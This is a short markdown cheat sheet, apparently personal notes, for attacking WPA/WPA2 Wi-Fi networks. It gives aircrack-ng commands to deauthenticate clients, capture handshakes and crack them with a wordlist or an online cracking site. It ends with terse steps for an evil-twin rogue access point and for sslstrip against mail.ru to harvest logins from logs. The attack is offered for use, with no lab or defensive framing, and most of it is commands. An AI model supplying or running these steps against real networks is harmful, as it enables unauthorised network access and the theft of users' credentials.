# Evil Twin WPA/WPA2


## Setup
```bash
sudo apt update
sudo apt upgrade
sudo apt install aircrack-ng
```


## Deauth Packet

```bash
sudo aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX InterfaceInMonitorMode
```


## Capture handshakes
```bash
sudo airmon-ng
```
Select interface in list and start it in monitor mode.

```bash
sudo airmon-ng start wlan1
sudo airodump-ng wlan1mon
```

Select AP and remember BSSID and channel.

```bash
sudo airodump-ng --bssid XX:XX:XX:XX:XX --channel X --write FileForDump InterfaceInMonitorMode
```

[More information](https://www.thepolyglotdeveloper.com/2018/06/crack-wireless-passwords-raspberry-pi-aircrack/).

## How to crack

Use [this site](https://www.onlinehashcrack.com/).
Or do it local.

```bash
sudo aircrack-ng DumpFile.cap -w path/to/dict
```

[More information](https://www.thepolyglotdeveloper.com/2018/06/crack-wireless-passwords-raspberry-pi-aircrack/).

## Evil Twin
mitmAP with same name and channel
deauth
??????
PROFIT


## Sslstrip2
go to [mail.ru](mail.ru)

check logss
